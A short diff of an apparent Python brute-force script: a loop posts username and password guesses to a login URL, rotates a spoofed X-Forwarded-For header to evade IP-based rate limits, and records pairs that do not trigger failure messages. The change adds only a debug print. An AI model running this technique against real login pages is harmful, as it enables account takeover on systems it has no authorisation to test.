@@ -42,6 +42,7 @@ def valid_password(url, valid_usernames, passwords,patterns):
             headers = {'X-Forwarded-For':str(int(passwords.index(password)+.0)+1)}
             response_pass = requests.post(url=url,data={"username":username,"password":password},headers=headers)
             print("Validating password: {}\tUser: {}\tResponse length: {}".format(password,username,len(response_pass.content)))
+            print(response_pass.content)
             resp_clean = " ".join(re.sub(re.compile('<.*?>'), '', response_pass.text).split())
             if (patterns[0] not in resp_clean and patterns[1] not in resp_clean):            
                 valid_password[username] = password
